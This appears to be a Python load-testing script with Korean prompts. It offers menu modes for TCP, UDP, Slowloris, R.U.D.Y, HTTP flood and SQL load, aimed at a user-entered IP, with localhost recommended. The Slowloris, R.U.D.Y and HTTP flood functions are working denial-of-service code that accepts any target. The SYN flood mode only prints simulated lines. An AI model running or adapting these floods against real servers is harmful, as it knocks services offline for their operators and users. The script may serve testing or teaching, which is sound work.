import subprocess
import sys

# ---------------- 라이브러리 자동 설치 ----------------
required_libs = []  # 현재 필요한 외부 라이브러리 없음
for lib in required_libs:
    try:
        __import__(lib)
    except ImportError:
        print(f"[설치 중] {lib} 설치...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

# ---------------- 라이브러리 임포트 ----------------
import socket
import threading
import time
import random
import sqlite3

stop_flag = False
packet_count = 0

def input_listener():
    global stop_flag
    input("Enter 누르면 종료...\n")
    stop_flag = True

# ---------------- TCP ----------------
def tcp_normal(ip, port):
    global packet_count
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        while not stop_flag:
            s.sendall(b"Hello TCP Server!")
            data = s.recv(1024)
            packet_count += 1
            print(f"[TCP] 패킷 {packet_count} 정상: 서버 응답: {data.decode()}")

def tcp_invalid(ip, port, flags):
    global packet_count
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        while not stop_flag:
            flag = random.choice(flags)
            payload = bytes([0x00,0xFF]) + flag.encode() + b"INVALID"
            s.sendall(payload)
            data = s.recv(1024)
            packet_count += 1
            print(f"[TCP] 패킷 {packet_count} 비정상 플래그:{flag}, 서버 응답:{data.decode(errors='ignore')}")

def tcp_synflood(ip, port):
    global packet_count
    while not stop_flag:
        packet_count += 1
        print(f"[TCP] SYN Flood 시뮬레이션 패킷 {packet_count} {ip}:{port}")
        time.sleep(0.2)

# ---------------- UDP ----------------
def udp_send(ip, port, rate):
    global packet_count
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while not stop_flag:
            s.sendto(b"UDP TEST PACKET", (ip, port))
            packet_count += 1
            print(f"[UDP] 패킷 {packet_count} 전송 {ip}:{port}")
            time.sleep(1/rate)

# ---------------- Slowloris ----------------
def slowloris(ip, port, connections, delay):
    global packet_count
    sockets = []
    for i in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendall(b"GET / HTTP/1.1\r\n")
            sockets.append(s)
        except:
            print(f"[Slowloris] 연결 실패 {i+1}")
    while not stop_flag:
        for idx, s in enumerate(sockets):
            try:
                s.sendall(b"X-a: keep-alive\r\n")
                packet_count += 1
                print(f"[Slowloris] 연결 {idx+1} 패킷 {packet_count}")
                time.sleep(delay)
            except:
                pass

# ---------------- R.U.D.Y ----------------
def ruddy(ip, port, connections, delay, body_size=1024):
    global packet_count
    sockets = []
    for i in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendall(b"POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: %d\r\n\r\n" % body_size)
            sockets.append(s)
        except:
            print(f"[R.U.D.Y] 연결 실패 {i+1}")
    while not stop_flag:
        for idx, s in enumerate(sockets):
            try:
                s.sendall(b"A")
                packet_count += 1
                print(f"[R.U.D.Y] 연결 {idx+1} 패킷 {packet_count}")
                time.sleep(delay)
            except:
                pass

# ---------------- HTTP Flood ----------------
def http_flood(ip, port, connections, delay, method="GET"):
    global packet_count
    sockets = []
    request_line = f"{method} / HTTP/1.1\r\nHost: localhost\r\n\r\n".encode()
    
    for i in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            sockets.append(s)
        except:
            print(f"[HTTP Flood] 연결 실패 {i+1}")

    while not stop_flag:
        for idx, s in enumerate(sockets):
            try:
                s.sendall(request_line)
                packet_count += 1
                print(f"[HTTP Flood] 연결 {idx+1} 패킷 {packet_count}")
                time.sleep(delay)
            except:
                pass

# ---------------- SQL 부하 시뮬 ----------------
def sql_ddos(connections, delay):
    global packet_count
    conn = sqlite3.connect(":memory:")
    cur = conn.cursor()
    cur.execute("CREATE TABLE test(id INTEGER, value TEXT);")
    for i in range(1000):
        cur.execute("INSERT INTO test VALUES (?, ?);", (i, "x"*100))
    conn.commit()
    
    while not stop_flag:
        for i in range(connections):
            packet_count += 1
            cur.execute("SELECT * FROM test WHERE id>=0;")
            print(f"[SQL] 쿼리 {packet_count}")
            time.sleep(delay)

# ---------------- 메인 ----------------
if __name__ == "__main__":
    target_ip = input("목표 IP 입력 (127.0.0.1 추천): ")

    print("\n모드 선택 (이름 표시):")
    print("TCP / UDP / Slowloris / R.U.D.Y / HTTP / SQL")
    protocol = input("선택: ").lower()

    threading.Thread(target=input_listener, daemon=True).start()

    if protocol == "tcp":
        target_port = int(input("포트 입력 (5000 추천): "))
        tcp_mode = input("TCP 모드 선택 (normal / invalid / synflood): ")
        flags = []
        if tcp_mode == "invalid":
            flag_input = input("플래그 선택 (R, F, U, P, 여러개는 ,로 구분): ")
            flags = [f.strip() for f in flag_input.split(",")]
        if tcp_mode == "normal":
            tcp_normal(target_ip, target_port)
        elif tcp_mode == "invalid" and flags:
            tcp_invalid(target_ip, target_port, flags)
        elif tcp_mode == "synflood":
            tcp_synflood(target_ip, target_port)
        else:
            print("잘못된 TCP 모드 선택")

    elif protocol == "udp":
        target_port = int(input("포트 입력 (5000 추천): "))
        rate = float(input("초당 패킷 수(rate) 입력: "))
        udp_send(target_ip, target_port, rate)

    elif protocol == "slowloris":
        target_port = int(input("포트 입력 (HTTP 서버 포트, 예: 8080): "))
        connections = int(input("연결 수 입력: "))
        delay = float(input("헤더 전송 지연 시간(초) 입력: "))
        slowloris(target_ip, target_port, connections, delay)

    elif protocol == "ruddy":
        target_port = int(input("포트 입력 (HTTP 서버 포트, 예: 8080): "))
        connections = int(input("동시 연결 수: "))
        delay = float(input("POST body 전송 지연 시간(초) 입력: "))
        ruddy(target_ip, target_port, connections, delay)

    elif protocol == "http":
        target_port = int(input("포트 입력 (HTTP 서버 포트, 예: 8080): "))
        connections = int(input("동시 연결 수: "))
        delay = float(input("요청 전송 간격(초): "))
        method = input("HTTP 메서드 선택 (GET/POST, 기본 GET): ").upper()
        http_flood(target_ip, target_port, connections, delay, method)

    elif protocol == "sql":
        connections = int(input("쿼리 동시 실행 수 입력: "))
        delay = float(input("쿼리 전송 간격(초): "))
        sql_ddos(connections, delay)

    else:
        print("잘못된 프로토콜 선택")